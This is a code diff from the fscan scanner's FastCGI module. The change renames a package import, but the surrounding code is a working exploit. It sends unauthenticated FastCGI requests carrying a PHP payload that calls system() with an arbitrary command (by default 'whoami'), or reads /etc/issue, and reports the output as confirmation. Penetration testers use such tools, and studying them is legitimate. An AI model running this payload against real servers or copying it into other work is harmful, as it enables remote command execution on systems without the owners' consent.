@@ -6,8 +6,8 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"github.com/shadow1ng/fscan/Common"
 	"github.com/shadow1ng/fscan/Config"
-	"github.com/shadow1ng/fscan/common"
 	"io"
 	"strconv"
 	"strings"
@@ -22,14 +22,14 @@ import (
 // FcgiScan 执行FastCGI服务器漏洞扫描
 func FcgiScan(info *Config.HostInfo) error {
 	// 如果设置了暴力破解模式则跳过
-	if common.IsBrute {
+	if Common.IsBrute {
 		return nil
 	}
 
 	// 设置目标URL路径
 	url := "/etc/issue"
-	if common.Path != "" {
-		url = common.Path
+	if Common.Path != "" {
+		url = Common.Path
 	}
 	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)
 
@@ -38,10 +38,10 @@ func FcgiScan(info *Config.HostInfo) error {
 	var cutLine = "-----ASDGTasdkk361363s-----\n" // 用于分割命令输出的标记
 
 	switch {
-	case common.Command == "read":
+	case Common.Command == "read":
 		reqParams = "" // 读取模式
-	case common.Command != "":
-		reqParams = fmt.Sprintf("<?php system('%s');die('%s');?>", common.Command, cutLine) // 自定义命令
+	case Common.Command != "":
+		reqParams = fmt.Sprintf("<?php system('%s');die('%s');?>", Common.Command, cutLine) // 自定义命令
 	default:
 		reqParams = fmt.Sprintf("<?php system('whoami');die('%s');?>", cutLine) // 默认执行whoami
 	}
@@ -65,7 +65,7 @@ func FcgiScan(info *Config.HostInfo) error {
 	}
 
 	// 建立FastCGI连接
-	fcgi, err := New(addr, common.Timeout)
+	fcgi, err := New(addr, Common.Timeout)
 	defer func() {
 		if fcgi.rwc != nil {
 			fcgi.rwc.Close()
@@ -97,7 +97,7 @@ func FcgiScan(info *Config.HostInfo) error {
 			result = fmt.Sprintf("[+] FastCGI漏洞确认 %v:%v\n命令输出:\n%v",
 				info.Host, info.Ports, output)
 		}
-		common.LogSuccess(result)
+		Common.LogSuccess(result)
 	} else if strings.Contains(output, "File not found") ||
 		strings.Contains(output, "Content-type") ||
 		strings.Contains(output, "Status") {
@@ -109,7 +109,7 @@ func FcgiScan(info *Config.HostInfo) error {
 			result = fmt.Sprintf("[*] FastCGI服务确认 %v:%v\n响应:\n%v",
 				info.Host, info.Ports, output)
 		}
-		common.LogSuccess(result)
+		Common.LogSuccess(result)
 	}
 
 	return nil
@@ -187,7 +187,7 @@ type FCGIClient struct {
 }
 
 func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
-	conn, err := common.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
+	conn, err := Common.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
 	fcgi = &FCGIClient{
 		rwc:       conn,
 		keepAlive: false,
